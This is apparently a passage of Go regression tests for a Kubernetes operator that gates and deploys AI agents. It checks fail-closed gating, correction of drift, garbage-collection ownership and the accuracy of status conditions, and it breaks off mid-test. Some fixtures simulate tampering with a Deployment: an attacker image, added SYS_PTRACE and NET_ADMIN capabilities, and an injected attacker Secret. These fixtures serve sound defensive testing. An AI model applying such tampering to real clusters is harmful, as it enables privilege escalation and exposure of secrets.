// SPDX-FileCopyrightText: 2026 Quinyte
// SPDX-License-Identifier: Apache-2.0

package envtest

import (
	"context"
	"strings"
	"testing"

	appsv1 "k8s.io/api/apps/v1"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/types"
	"k8s.io/apimachinery/pkg/util/yaml"
	ctrl "sigs.k8s.io/controller-runtime"
	"sigs.k8s.io/controller-runtime/pkg/client"

	assaydv1alpha1 "github.com/Quinyte/assayd/api/v1alpha1"
	"github.com/Quinyte/assayd/internal/controller"
	"github.com/Quinyte/assayd/internal/revision"
)

// Regression tests for the four blockers the independent review found. Each is
// written to fail against the code as reviewed, so the fix is demonstrated
// rather than asserted.

// B1 — the safety hook must not fail open.
//
// EvalSuiteInstalled was a nil-tolerant hook returning false, which made
// gatesSatisfied return true: an unwired reconciler promoted everything through
// declared gates, and set GatesSkipped with reason EvalSuiteCRDAbsent — a check
// it never performed. cmd/ is empty, so the first person to wire the manager
// would have decided ADR-0006's fate by whether they remembered one field.
func TestUnwiredReconcilerHoldsRatherThanPromotingUngated(t *testing.T) {
	ns := newNamespace(t)
	a := mustCreateAgent(t, ns, "unwired", func(a *assaydv1alpha1.Agent) {
		a.Spec.Gates = []assaydv1alpha1.GateRef{{EvalSuiteRef: "pa-regression"}}
	})

	// Constructed exactly as an unwired cmd/ would leave it — apart from the two
	// fields without which no workload can be placed at all (A42).
	r := &controller.AgentReconciler{Client: k8s, Scheme: scheme,
		OperatorNamespace: operatorNamespace, LabelAuthorityPresent: labelAuthorityPresent}

	settle(t, r, a)
	markAvailable(t, ns, controller.WorkloadName("unwired", revision.MustHash(a.Spec)), 1)
	got := settle(t, r, a)

	if got.Status.ActiveRevision != "" {
		t.Errorf("an unwired reconciler promoted revision %q through a declared gate. "+
			"Holding is recoverable; ungated promotion is not, so the unset default must hold.",
			got.Status.ActiveRevision)
	}
	if c := condition(&got, assaydv1alpha1.CondGatesSkipped); c != nil && c.Status == metav1.ConditionTrue {
		t.Errorf("GatesSkipped=True with reason %q, but no CRD check was performed — "+
			"NFR-8 requires the degraded path be loud AND true", c.Reason)
	}
	// The condition must name the real cause. Asserting only the absence of
	// GatesSkipped would accept any other wrong answer.
	c := condition(&got, assaydv1alpha1.CondGatesPassed)
	if c == nil || c.Status != metav1.ConditionFalse {
		t.Fatal("an unwired operator must report GatesPassed=False")
	}
	if c.Reason != "GateDetectionUnwired" {
		t.Errorf("reason is %q; it must say the operator cannot tell whether gating applies, "+
			"not invent a cause it never checked", c.Reason)
	}
}

// B2 + M6 — policy-surface fields are applied in place, and out-of-band drift is
// corrected.
//
// A12 puts runtime.resources and runtime.port on the policy surface, meaning
// "applied in place". ensureWorkload synced only replicas, so raising memory to
// stop OOM kills was a silent no-op on a green agent. The same gap let anyone
// with deployments/update rewrite the image of a gated revision: the gate passed
// on X, the pods ran Y, and the CR asserted X.
func TestPolicySurfaceEditsReachTheWorkload(t *testing.T) {
	ns := newNamespace(t)
	a := mustCreateAgent(t, ns, "inplace", func(a *assaydv1alpha1.Agent) {
		a.Spec.Runtime.Resources = corev1.ResourceRequirements{
			Requests: corev1.ResourceList{corev1.ResourceMemory: resource.MustParse("64Mi")},
		}
	})
	r := newReconciler(false)
	rev := revision.MustHash(a.Spec)
	settle(t, r, a)
	markAvailable(t, ns, controller.WorkloadName("inplace", rev), 1)
	settle(t, r, a)

	// Raise memory. This must NOT mint a revision (A12) and must reach the pods.
	if err := k8s.Get(context.Background(), client.ObjectKeyFromObject(a), a); err != nil {
		t.Fatalf("get: %v", err)
	}
	a.Spec.Runtime.Resources.Requests[corev1.ResourceMemory] = resource.MustParse("512Mi")
	if err := k8s.Update(context.Background(), a); err != nil {
		t.Fatalf("update: %v", err)
	}
	if revision.MustHash(a.Spec) != rev {
		t.Fatal("fixture: a resources edit minted a revision; A12 says it is policy-surface")
	}
	settle(t, r, a)

	var d appsv1.Deployment
	key := types.NamespacedName{Namespace: runNS(ns), Name: controller.WorkloadName("inplace", rev)}
	if err := k8s.Get(context.Background(), key, &d); err != nil {
		t.Fatalf("get deployment: %v", err)
	}
	got := d.Spec.Template.Spec.Containers[0].Resources.Requests[corev1.ResourceMemory]
	if got.String() != "512Mi" {
		t.Errorf("memory request is %s after an in-place edit to 512Mi. An operator "+
			"raising memory to stop OOM kills got a green agent and no change.", got.String())
	}
}

func TestOutOfBandDriftIsCorrected(t *testing.T) {
	ns := newNamespace(t)
	a := mustCreateAgent(t, ns, "drift", nil)
	r := newReconciler(false)
	rev := revision.MustHash(a.Spec)
	settle(t, r, a)
	markAvailable(t, ns, controller.WorkloadName("drift", rev), 1)
	settle(t, r, a)

	// Anyone with deployments/update in the namespace.
	var d appsv1.Deployment
	key := types.NamespacedName{Namespace: runNS(ns), Name: controller.WorkloadName("drift", rev)}
	if err := k8s.Get(context.Background(), key, &d); err != nil {
		t.Fatalf("get: %v", err)
	}
	d.Spec.Template.Spec.Containers[0].Image = "ghcr.io/attacker/evil:latest"
	d.Spec.Template.Spec.Containers[0].SecurityContext.ReadOnlyRootFilesystem = boolPtr(false)
	if err := k8s.Update(context.Background(), &d); err != nil {
		t.Fatalf("tamper: %v", err)
	}

	settle(t, r, a)

	if err := k8s.Get(context.Background(), key, &d); err != nil {
		t.Fatalf("get: %v", err)
	}
	if img := d.Spec.Template.Spec.Containers[0].Image; img != a.Spec.Runtime.Image {
		t.Errorf("image is still %q after reconcile. The gate passed on one revision and "+
			"the pods run another, while the CR asserts the first — ADR-0006 bypassed by "+
			"anyone with deployments/update.", img)
	}
	if ro := d.Spec.Template.Spec.Containers[0].SecurityContext.ReadOnlyRootFilesystem; ro == nil || !*ro {
		t.Error("hardening was not restored: it is a create-time decoration, not an invariant")
	}
}

// B3 — a spec-less Agent must be rejected at admission, not dereferenced.
//
// spec was json:"spec,omitempty" with no required, and the CEL rule is scoped to
// spec, so it never evaluated on an object with no spec key at all.
func TestSpecIsRequired(t *testing.T) {
	ns := newNamespace(t)
	doc := `
apiVersion: assayd.dev/v1alpha1
kind: Agent
metadata: {name: nospec}
`
	var obj unstructured.Unstructured
	if err := yaml.Unmarshal([]byte(doc), &obj.Object); err != nil {
		t.Fatalf("parse: %v", err)
	}
	obj.SetNamespace(ns)
	if err := k8s.Create(context.Background(), &obj); err == nil {
		t.Fatal("an Agent with no spec was admitted; the reconciler then dereferences nil " +
			"and any namespace user can wedge it in a hot backoff loop")
	}
}

// B4 — the collector must not delete Deployments it does not own.
//
// ownedWorkloads selected on a label alone. A stray assayd.dev/agent label —
// copied from an example, applied by a Kustomize commonLabels, or set by anyone
// with deployment-create — turned this operator into a deleter of other
// people's workloads.
func TestGarbageCollectorIgnoresUnownedWorkloads(t *testing.T) {
	ns := newNamespace(t)
	a := mustCreateAgent(t, ns, "gcprobe", nil)
	r := newReconciler(false)
	settle(t, r, a)

	// Four unrelated Deployments carrying only the agent label.
	var names []string
	for i := 0; i < 4; i++ {
		name := "bystander-" + string(rune('a'+i))
		names = append(names, name)
		d := &appsv1.Deployment{
			ObjectMeta: metav1.ObjectMeta{
				Name: name, Namespace: runNS(ns),
				Labels: map[string]string{controller.LabelAgent: "gcprobe"},
			},
			Spec: appsv1.DeploymentSpec{
				Selector: &metav1.LabelSelector{MatchLabels: map[string]string{"app": name}},
				Template: corev1.PodTemplateSpec{
					ObjectMeta: metav1.ObjectMeta{Labels: map[string]string{"app": name}},
					Spec:       corev1.PodSpec{Containers: []corev1.Container{{Name: "c", Image: "busybox"}}},
				},
			},
		}
		if err := k8s.Create(context.Background(), d); err != nil {
			t.Fatalf("create bystander: %v", err)
		}
	}

	settle(t, r, a)

	for _, name := range names {
		var d appsv1.Deployment
		err := k8s.Get(context.Background(), types.NamespacedName{Namespace: runNS(ns), Name: name}, &d)
		if err != nil {
			t.Errorf("the operator deleted %s, a Deployment it does not own — a stray label "+
				"must not make this a deleter of other people's workloads: %v", name, err)
		}
	}
}

// The ownership guard alone, isolated: bystanders that carry BOTH assayd labels,
// including a plausible revision hash, and differ only in having no controller
// reference. Without the UID check these are indistinguishable from real
// revisions and fall straight into the retention window.
func TestOwnershipIsDecidedByControllerRefNotLabels(t *testing.T) {
	ns := newNamespace(t)
	a := mustCreateAgent(t, ns, "ownercheck", nil)
	r := newReconciler(false)
	settle(t, r, a)

	var names []string
	for i := 0; i < 4; i++ {
		name := "impostor-" + string(rune('a'+i))
		names = append(names, name)
		labels := map[string]string{
			controller.LabelAgent:    "ownercheck",
			controller.LabelRevision: "deadbeef0" + string(rune('0'+i)),
		}
		d := &appsv1.Deployment{
			ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: runNS(ns), Labels: labels},
			Spec: appsv1.DeploymentSpec{
				Selector: &metav1.LabelSelector{MatchLabels: map[string]string{"app": name}},
				Template: corev1.PodTemplateSpec{
					ObjectMeta: metav1.ObjectMeta{Labels: map[string]string{"app": name}},
					Spec:       corev1.PodSpec{Containers: []corev1.Container{{Name: "c", Image: "busybox"}}},
				},
			},
		}
		if err := k8s.Create(context.Background(), d); err != nil {
			t.Fatalf("create impostor: %v", err)
		}
	}

	settle(t, r, a)

	for _, name := range names {
		var d appsv1.Deployment
		if err := k8s.Get(context.Background(), types.NamespacedName{Namespace: runNS(ns), Name: name}, &d); err != nil {
			t.Errorf("the operator deleted %s: it carries this agent's labels and a revision "+
				"label but neither the agent's UID label nor the <agent>-<revision> name, so "+
				"ownership must be decided by the name — which nobody can forge by labelling "+
				"(A60): %v", name, err)
		}
	}
}

// The revision-label guard alone, isolated: a workload this Agent genuinely owns
// but which carries no revision label cannot be placed in the retention window,
// so it must never be a GC candidate.
func TestOwnedWorkloadWithoutARevisionLabelIsNotCollected(t *testing.T) {
	ns := newNamespace(t)
	a := mustCreateAgent(t, ns, "unlabelled", nil)
	r := newReconciler(false)
	settle(t, r, a)

	var agent assaydv1alpha1.Agent
	if err := k8s.Get(context.Background(), client.ObjectKeyFromObject(a), &agent); err != nil {
		t.Fatalf("get: %v", err)
	}

	var names []string
	for i := 0; i < 4; i++ {
		name := "unrevisioned-" + string(rune('a'+i))
		names = append(names, name)
		d := &appsv1.Deployment{
			ObjectMeta: metav1.ObjectMeta{
				Name: name, Namespace: runNS(ns),
				// Carries the agent's UID — the provenance label (A60) — so only
				// the missing revision label can save it.
				Labels: map[string]string{controller.LabelAgent: "unlabelled",
					controller.LabelAgentUID: string(agent.UID)},
			},
			Spec: appsv1.DeploymentSpec{
				Selector: &metav1.LabelSelector{MatchLabels: map[string]string{"app": name}},
				Template: corev1.PodTemplateSpec{
					ObjectMeta: metav1.ObjectMeta{Labels: map[string]string{"app": name}},
					Spec:       corev1.PodSpec{Containers: []corev1.Container{{Name: "c", Image: "busybox"}}},
				},
			},
		}
		if err := k8s.Create(context.Background(), d); err != nil {
			t.Fatalf("create: %v", err)
		}
	}

	settle(t, r, a)

	for _, name := range names {
		var d appsv1.Deployment
		if err := k8s.Get(context.Background(), types.NamespacedName{Namespace: runNS(ns), Name: name}, &d); err != nil {
			t.Errorf("the operator collected %s, which it owns but which carries no revision "+
				"label — it cannot be placed in the retention window, so it must not be a "+
				"GC candidate: %v", name, err)
		}
	}
}

// m18: normal-true conditions must stay in the list once set. Dropping
// GatesPassed when an EvalSuite CRD is uninstalled would erase the record that a
// revision ever passed a gate.
func TestNormalTrueConditionsAreSticky(t *testing.T) {
	ns := newNamespace(t)
	a := mustCreateAgent(t, ns, "sticky", func(a *assaydv1alpha1.Agent) {
		a.Spec.Gates = []assaydv1alpha1.GateRef{{EvalSuiteRef: "s"}}
	})

	// With the CRD present and gates declared, GatesPassed is asserted False.
	settle(t, newReconciler(true), a)
	var got assaydv1alpha1.Agent
	if err := k8s.Get(context.Background(), client.ObjectKeyFromObject(a), &got); err != nil {
		t.Fatalf("get: %v", err)
	}
	if condition(&got, assaydv1alpha1.CondGatesPassed) == nil {
		t.Fatal("fixture: GatesPassed was never set")
	}

	// Now the CRD goes away: this pass asserts GatesSkipped instead and never
	// speaks to GatesPassed.
	settle(t, newReconciler(false), a)
	if err := k8s.Get(context.Background(), client.ObjectKeyFromObject(a), &got); err != nil {
		t.Fatalf("get: %v", err)
	}
	if condition(&got, assaydv1alpha1.CondGatesPassed) == nil {
		t.Error("GatesPassed was dropped when a later pass stopped asserting it. Its absence " +
			"is indistinguishable from never-evaluated, so the record that this revision was " +
			"gated is gone.")
	}
}

// M5 — a routine spec edit on a serving agent must not report it unhealthy, and
// must not claim a canary that is not shifting any traffic.
func TestSpecEditOnAServingAgentStaysReady(t *testing.T) {
	ns := newNamespace(t)
	a := mustCreateAgent(t, ns, "rolling", nil)
	r := newReconciler(false)
	first := revision.MustHash(a.Spec)
	settle(t, r, a)
	markAvailable(t, ns, controller.WorkloadName("rolling", first), 1)
	settle(t, r, a)

	if err := k8s.Get(context.Background(), client.ObjectKeyFromObject(a), a); err != nil {
		t.Fatalf("get: %v", err)
	}
	a.Spec.Runtime.Image = "ghcr.io/acme/agent@sha256:5669fbc273a09c85000000000000000000000000000000000000000000000000"
	if err := k8s.Update(context.Background(), a); err != nil {
		t.Fatalf("update: %v", err)
	}
	got := settle(t, r, a)

	// The old revision still holds all traffic and is healthy.
	if got.Status.Phase == assaydv1alpha1.PhaseCanary {
		t.Error("phase is Canary while zero traffic is shifting: §3.3 fixes Canary as " +
			"\"weights shift\", and there is no gateway yet")
	}
	if c := condition(&got, assaydv1alpha1.CondReady); c == nil || c.Status != metav1.ConditionTrue {
		t.Error("Ready=False on an agent that is serving normally: every routine spec edit " +
			"would trip any alert keyed on the canonical condition")
	}
	if c := condition(&got, assaydv1alpha1.CondProgressing); c == nil || c.Status != metav1.ConditionTrue {
		t.Error("a rollout in flight must be visible as Progressing=True (A13)")
	}
	if got.Status.ActiveRevision != first {
		t.Errorf("activeRevision moved to %q before the new revision could serve", got.Status.ActiveRevision)
	}
}

func boolPtr(b bool) *bool { return &b }

var _ = ctrl.Request{}

// N1 — DeepDerivative ignores fields that are empty in `desired`, so CLEARING a
// value was invisible: B2's silent no-op surviving inside B2's fix, on the
// narrower input of removal rather than change.
func TestPolicySurfaceRemovalsAlsoReachTheWorkload(t *testing.T) {
	ns := newNamespace(t)
	a := mustCreateAgent(t, ns, "removal", func(a *assaydv1alpha1.Agent) {
		a.Spec.Runtime.Resources = corev1.ResourceRequirements{
			Requests: corev1.ResourceList{
				corev1.ResourceMemory: resource.MustParse("64Mi"),
				corev1.ResourceCPU:    resource.MustParse("250m"),
			},
		}
	})
	r := newReconciler(false)
	rev := revision.MustHash(a.Spec)
	settle(t, r, a)
	markAvailable(t, ns, controller.WorkloadName("removal", rev), 1)
	settle(t, r, a)

	key := types.NamespacedName{Namespace: runNS(ns), Name: controller.WorkloadName("removal", rev)}

	// Drop ONE key. Every key still in desired matches, so a derivative
	// comparison sees no difference and the stale cpu request survives.
	if err := k8s.Get(context.Background(), client.ObjectKeyFromObject(a), a); err != nil {
		t.Fatalf("get: %v", err)
	}
	delete(a.Spec.Runtime.Resources.Requests, corev1.ResourceCPU)
	if err := k8s.Update(context.Background(), a); err != nil {
		t.Fatalf("update: %v", err)
	}
	settle(t, r, a)

	var d appsv1.Deployment
	if err := k8s.Get(context.Background(), key, &d); err != nil {
		t.Fatalf("get deployment: %v", err)
	}
	if _, stale := d.Spec.Template.Spec.Containers[0].Resources.Requests[corev1.ResourceCPU]; stale {
		t.Error("a removed cpu request is still on the pod: dropping one key from the map " +
			"left the stale value, because every key that remains still matches")
	}

	// Clear the block entirely.
	if err := k8s.Get(context.Background(), client.ObjectKeyFromObject(a), a); err != nil {
		t.Fatalf("get: %v", err)
	}
	a.Spec.Runtime.Resources = corev1.ResourceRequirements{}
	if err := k8s.Update(context.Background(), a); err != nil {
		t.Fatalf("update: %v", err)
	}
	settle(t, r, a)

	if err := k8s.Get(context.Background(), key, &d); err != nil {
		t.Fatalf("get deployment: %v", err)
	}
	if len(d.Spec.Template.Spec.Containers[0].Resources.Requests) != 0 {
		t.Errorf("resources are still %v after being cleared: an operator removing a "+
			"request gets a green agent and no change",
			d.Spec.Template.Spec.Containers[0].Resources.Requests)
	}
}

// N2 — the gate-hold branch must not report a serving agent unhealthy, and must
// not let a sticky Progressing reason go stale.
func TestHoldingOnGatesKeepsAServingAgentReady(t *testing.T) {
	ns := newNamespace(t)
	a := mustCreateAgent(t, ns, "holdready", nil)
	// Promote once with no gates and no EvalSuite CRD.
	r := newReconciler(false)
	first := revision.MustHash(a.Spec)
	settle(t, r, a)
	markAvailable(t, ns, controller.WorkloadName("holdready", first), 1)
	settle(t, r, a)

	// Now add gates and the CRD: the new candidate must hold, while the old
	// revision keeps serving.
	if err := k8s.Get(context.Background(), client.ObjectKeyFromObject(a), a); err != nil {
		t.Fatalf("get: %v", err)
	}
	a.Spec.Gates = []assaydv1alpha1.GateRef{{EvalSuiteRef: "pa-regression"}}
	a.Spec.Runtime.Image = "ghcr.io/acme/agent@sha256:5669fbc273a09c85000000000000000000000000000000000000000000000000"
	if err := k8s.Update(context.Background(), a); err != nil {
		t.Fatalf("update: %v", err)
	}
	gated := newReconciler(true)
	second := revision.MustHash(a.Spec)
	settle(t, gated, a)
	markAvailable(t, ns, controller.WorkloadName("holdready", second), 1)
	got := settle(t, gated, a)

	if got.Status.ActiveRevision != first {
		t.Fatalf("fixture: active is %q, want the original %q", got.Status.ActiveRevision, first)
	}
	ready := condition(&got, assaydv1alpha1.CondReady)
	if ready == nil || ready.Status != metav1.ConditionTrue {
		t.Error("Ready=False while the original revision still serves all traffic: adding " +
			"gates to a healthy agent must not page the on-call")
	}
	// Ready is sticky, so finding it True is not enough: an inherited value from
	// before the gates were added would look identical. The hold branch must
	// ASSERT it, which shows up as an observedGeneration matching the current one.
	if ready != nil && ready.ObservedGeneration != got.Generation {
		t.Errorf("Ready was carried over from generation %d rather than asserted at %d — "+
			"a sticky condition the branch never speaks to can go stale",
			ready.ObservedGeneration, got.Generation)
	}
	c := condition(&got, assaydv1alpha1.CondProgressing)
	if c == nil || c.Status != metav1.ConditionTrue {
		t.Fatal("a candidate held on gates is still a rollout in flight")
	}
	if c.Reason != "AwaitingGates" {
		t.Errorf("Progressing reason is %q, but the candidate IS available and is held on "+
			"gates — a sticky condition whose branch stays silent goes stale", c.Reason)
	}
}

// N3 — with nothing declared to gate, detection cannot change an outcome, so the
// condition must not claim to be holding an agent it just promoted.
func TestUnwiredWithNoGatesDoesNotClaimToHold(t *testing.T) {
	ns := newNamespace(t)
	a := mustCreateAgent(t, ns, "unwirednogates", nil) // no spec.gates
	r := &controller.AgentReconciler{Client: k8s, Scheme: scheme,
		OperatorNamespace: operatorNamespace, LabelAuthorityPresent: labelAuthorityPresent}
	settle(t, r, a)
	markAvailable(t, ns, controller.WorkloadName("unwirednogates", revision.MustHash(a.Spec)), 1)
	got := settle(t, r, a)

	if got.Status.ActiveRevision == "" {
		t.Fatal("fixture: an agent with no gates should promote regardless of wiring")
	}
	if c := condition(&got, assaydv1alpha1.CondGatesPassed); c != nil && c.Reason == "GateDetectionUnwired" {
		t.Error("the agent promoted, but the condition says it is holding rather than " +
			"promoting ungated — loud and wrong is the NFR-8 failure this was meant to fix")
	}
	if c := condition(&got, assaydv1alpha1.CondGatesSkipped); c == nil || c.Status != metav1.ConditionTrue {
		t.Error("with no gates declared the honest condition is GatesSkipped, whatever the wiring")
	}
}

// A defect found while mutation-testing the N2 fix: `ready` is computed for the
// DESIRED revision, so when desired == active and its pods die, the rollout
// branch was reporting Ready=True naming a revision that serves nothing — and a
// Progressing message claiming a revision was rolling out over itself.
func TestActiveRevisionLosingItsPodsIsNotReportedReady(t *testing.T) {
	ns := newNamespace(t)
	a := mustCreateAgent(t, ns, "podsdie", nil)
	r := newReconciler(false)
	rev := revision.MustHash(a.Spec)
	settle(t, r, a)
	name := controller.WorkloadName("podsdie", rev)
	markAvailable(t, ns, name, 1)
	got := settle(t, r, a)
	if got.Status.ActiveRevision != rev {
		t.Fatalf("fixture: not promoted")
	}

	// The pods die. No spec change: desired is still the active revision.
	markAvailable(t, ns, name, 0)
	got = settle(t, r, a)

	if c := condition(&got, assaydv1alpha1.CondReady); c == nil || c.Status != metav1.ConditionFalse {
		t.Errorf("Ready=%v while the only revision has no available replicas — the agent "+
			"serves nothing and says it is fine",
			func() any {
				if c == nil {
					return "absent"
				}
				return c.Status
			}())
	}
	if c := condition(&got, assaydv1alpha1.CondProgressing); c != nil && c.Status == metav1.ConditionTrue {
		t.Error("Progressing=True with no rollout in flight: the active revision is not " +
			"rolling out over itself")
	}
	if got.Status.CandidateRevision == rev {
		t.Error("the active revision was recorded as its own candidate")
	}
}

// Progressing is sticky, so every branch must speak to it or a stale True
// survives. Two paths where that matters:
//
//  1. a rollout that completes — Progressing must go False, not linger True
//  2. a rollout abandoned by reverting the spec, whose workload then dies — the
//     agent is degraded with NO rollout in flight, and must not still claim one
func TestProgressingIsClearedOnEveryExitFromARollout(t *testing.T) {
	ns := newNamespace(t)
	a := mustCreateAgent(t, ns, "progclear", nil)
	r := newReconciler(false)
	first := revision.MustHash(a.Spec)
	settle(t, r, a)
	markAvailable(t, ns, controller.WorkloadName("progclear", first), 1)
	settle(t, r, a)

	// Start a rollout.
	if err := k8s.Get(context.Background(), client.ObjectKeyFromObject(a), a); err != nil {
		t.Fatalf("get: %v", err)
	}
	a.Spec.Runtime.Image = "ghcr.io/acme/agent@sha256:5669fbc273a09c85000000000000000000000000000000000000000000000000"
	if err := k8s.Update(context.Background(), a); err != nil {
		t.Fatalf("update: %v", err)
	}
	second := revision.MustHash(a.Spec)
	got := settle(t, r, a)
	if c := condition(&got, assaydv1alpha1.CondProgressing); c == nil || c.Status != metav1.ConditionTrue {
		t.Fatal("fixture: the rollout did not register as Progressing")
	}

	// Path 1: it completes.
	markAvailable(t, ns, controller.WorkloadName("progclear", second), 1)
	got = settle(t, r, a)
	if c := condition(&got, assaydv1alpha1.CondProgressing); c == nil || c.Status != metav1.ConditionFalse {
		t.Error("Progressing did not go False when the rollout completed: a sticky " +
			"condition left True reports a rollout that finished long ago")
	}

	// Path 2: start another rollout, revert it, then the surviving workload dies.
	if err := k8s.Get(context.Background(), client.ObjectKeyFromObject(a), a); err != nil {
		t.Fatalf("get: %v", err)
	}
	a.Spec.Runtime.Image = "ghcr.io/acme/agent@sha256:5b187bff8aca8394000000000000000000000000000000000000000000000000"
	if err := k8s.Update(context.Background(), a); err != nil {
		t.Fatalf("update: %v", err)
	}
	got = settle(t, r, a)
	if c := condition(&got, assaydv1alpha1.CondProgressing); c == nil || c.Status != metav1.ConditionTrue {
		t.Fatal("fixture: second rollout did not register")
	}

	if err := k8s.Get(context.Background(), client.ObjectKeyFromObject(a), a); err != nil {
		t.Fatalf("get: %v", err)
	}
	a.Spec.Runtime.Image = "ghcr.io/acme/agent@sha256:5669fbc273a09c85000000000000000000000000000000000000000000000000" // back to the active revision
	if err := k8s.Update(context.Background(), a); err != nil {
		t.Fatalf("update: %v", err)
	}
	markAvailable(t, ns, controller.WorkloadName("progclear", second), 0)
	got = settle(t, r, a)

	if c := condition(&got, assaydv1alpha1.CondProgressing); c == nil || c.Status != metav1.ConditionFalse {
		t.Errorf("Progressing is %v on a degraded agent with no rollout in flight — the "+
			"branch that changed the situation stayed silent and the stale value survived",
			func() any {
				if c == nil {
					return "absent"
				}
				return c.Status
			}())
	}
}

// X1 — cell {active == desired, ready, gates unsatisfied}.
//
// `gates` is policy-surface (A12), so adding one does not mint a revision. The
// gate branch then held the revision that was already serving 100% of traffic,
// listing it as its own candidate. A12 put gates on the policy surface with the
// stated reason that "a gate that re-gated itself on edit could not converge" —
// which is exactly what that branch did.
func TestAddingGatesToARunningAgentDoesNotHoldIt(t *testing.T) {
	ns := newNamespace(t)
	a := mustCreateAgent(t, ns, "addgates", nil)
	rev := revision.MustHash(a.Spec)

	// Promote ungated.
	ungated := newReconciler(false)
	settle(t, ungated, a)
	markAvailable(t, ns, controller.WorkloadName("addgates", rev), 1)
	got := settle(t, ungated, a)
	if got.Status.ActiveRevision != rev {
		t.Fatalf("fixture: not promoted")
	}

	// Add gates and nothing else. The revision must not change.
	if err := k8s.Get(context.Background(), client.ObjectKeyFromObject(a), a); err != nil {
		t.Fatalf("get: %v", err)
	}
	a.Spec.Gates = []assaydv1alpha1.GateRef{{EvalSuiteRef: "pa-regression"}}
	if err := k8s.Update(context.Background(), a); err != nil {
		t.Fatalf("update: %v", err)
	}
	if revision.MustHash(a.Spec) != rev {
		t.Fatal("fixture: adding gates minted a revision; A12 says gates are policy-surface")
	}

	got = settle(t, newReconciler(true), a)

	if got.Status.Phase == assaydv1alpha1.PhaseHeld {
		t.Error("phase is Held on the revision that is serving 100% of traffic: gates apply " +
			"to a candidate that has not taken traffic, not retroactively to what is already live")
	}
	if got.Status.CandidateRevision == rev {
		t.Errorf("revision %s is listed as its own candidate while being the active "+
			"revision — kubectl get ag shows identical Active and Candidate columns, and "+
			"design 02 §7's 'candidate held >1h' alert fires immediately and can never clear",
			rev)
	}
	if got.Status.ActiveRevision != rev {
		t.Errorf("the running revision was demoted to %q by adding a gate", got.Status.ActiveRevision)
	}
	if c := condition(&got, assaydv1alpha1.CondProgressing); c != nil && c.Status == metav1.ConditionTrue {
		t.Error("Progressing=True claiming a rollout that cannot exist")
	}
}

// X2 — one tamper per field, so each comparison in containersEquivalent is
// individually load-bearing.
//
// TestOutOfBandDriftIsCorrected tampers with Image AND SecurityContext in one
// update, and the rewrite restores the whole container — so any single surviving
// comparison makes its assertion pass, and four of five comparisons could be
// deleted unnoticed. Attribution needs isolation.
func TestEachContainerFieldIsIndividuallyReconciled(t *testing.T) {
	for _, tc := range []struct {
		field  string
		tamper func(*corev1.Container)
		check  func(*testing.T, corev1.Container)
	}{
		{
			// The sharpest case, and the one a derivative comparison cannot see:
			// assayd leaves Privileged unset, and DeepDerivative ignores fields that
			// are empty in `desired`. So privilege escalation added out-of-band is
			// invisible to everything EXCEPT the exact container comparison.
			field: "capsAdd",
			tamper: func(c *corev1.Container) {
				c.SecurityContext.Capabilities.Add = []corev1.Capability{"NET_ADMIN", "SYS_PTRACE"}
			},
			check: func(t *testing.T, c corev1.Container) {
				if c.SecurityContext != nil && c.SecurityContext.Capabilities != nil &&
					len(c.SecurityContext.Capabilities.Add) > 0 {
					t.Errorf("added capabilities survived reconcile: %v. assayd sets "+
						"Capabilities{Drop: ALL} and leaves Add unset, so a derivative "+
						"comparison ignores it — anyone with deployments/update could grant "+
						"SYS_PTRACE and the operator would keep reporting Ready",
						c.SecurityContext.Capabilities.Add)
				}
			},
		},
		{
			field:  "roRootfs",
			tamper: func(c *corev1.Container) { c.SecurityContext.ReadOnlyRootFilesystem = boolPtr(false) },
			check: func(t *testing.T, c corev1.Container) {
				if c.SecurityContext == nil || c.SecurityContext.ReadOnlyRootFilesystem == nil ||
					!*c.SecurityContext.ReadOnlyRootFilesystem {
					t.Error("hardening was not restored: a pure-hardening tamper is invisible, " +
						"so the security context is a create-time decoration rather than an invariant")
				}
			},
		},
		{
			field:  "env",
			tamper: func(c *corev1.Container) { c.Env = []corev1.EnvVar{{Name: "INJECTED", Value: "x"}} },
			check: func(t *testing.T, c corev1.Container) {
				for _, e := range c.Env {
					if e.Name == "INJECTED" {
						t.Error("an injected env var survived: configuration drift is uncorrected")
					}
				}
			},
		},
		{
			field: "envFrom",
			tamper: func(c *corev1.Container) {
				c.EnvFrom = []corev1.EnvFromSource{{SecretRef: &corev1.SecretEnvSource{
					LocalObjectReference: corev1.LocalObjectReference{Name: "attacker-secret"}}}}
			},
			check: func(t *testing.T, c corev1.Container) {
				// The spec's own ConfigMap import must remain; the attacker's Secret
				// must not.
				for _, f := range c.EnvFrom {
					if f.SecretRef != nil && f.SecretRef.Name == "attacker-secret" {
						t.Error("an injected envFrom survived — anyone with deployments/update " +
							"could mount a Secret the CR never granted")
					}
				}
				if len(c.EnvFrom) != 1 || c.EnvFrom[0].ConfigMapRef == nil {
					t.Errorf("the spec's own envFrom was not restored: %v", c.EnvFrom)
				}
			},
		},
		{
			field:  "ports",
			tamper: func(c *corev1.Container) { c.Ports = []corev1.ContainerPort{{Name: "a2a", ContainerPort: 9999}} },
			check: func(t *testing.T, c corev1.Container) {
				if len(c.Ports) != 1 || c.Ports[0].ContainerPort != 8080 {
					t.Errorf("port drift was not corrected: %v", c.Ports)
				}
			},
		},
	} {
		t.Run(tc.field, func(t *testing.T) {
			ns := newNamespace(t)
			name := "tamper-" + strings.ToLower(tc.field)
			a := mustCreateAgent(t, ns, name, func(a *assaydv1alpha1.Agent) {
				a.Spec.Runtime.Env = []corev1.EnvVar{{Name: "MODE", Value: "strict"}}
				a.Spec.Runtime.EnvFrom = []corev1.EnvFromSource{{ConfigMapRef: &corev1.ConfigMapEnvSource{
					LocalObjectReference: corev1.LocalObjectReference{Name: "cfg"}}}}
			})
			r := newReconciler(false)
			mustCreateSource(t, ns, "ConfigMap", "cfg", map[string]string{"K": "v"})
			rev := revisionOf(t, ns, a.Spec)
			settle(t, r, a)
			key := types.NamespacedName{Namespace: runNS(ns), Name: controller.WorkloadName(name, rev)}
			markAvailable(t, ns, key.Name, 1)
			settle(t, r, a)

			var d appsv1.Deployment
			if err := k8s.Get(context.Background(), key, &d); err != nil {
				t.Fatalf("get: %v", err)
			}
			// Exactly one field, so only one comparison can detect it.
			tc.tamper(&d.Spec.Template.Spec.Containers[0])
			if err := k8s.Update(context.Background(), &d); err != nil {
				t.Fatalf("tamper: %v", err)
			}

			settle(t, r, a)

			if err := k8s.Get(context.Background(), key, &d); err != nil {
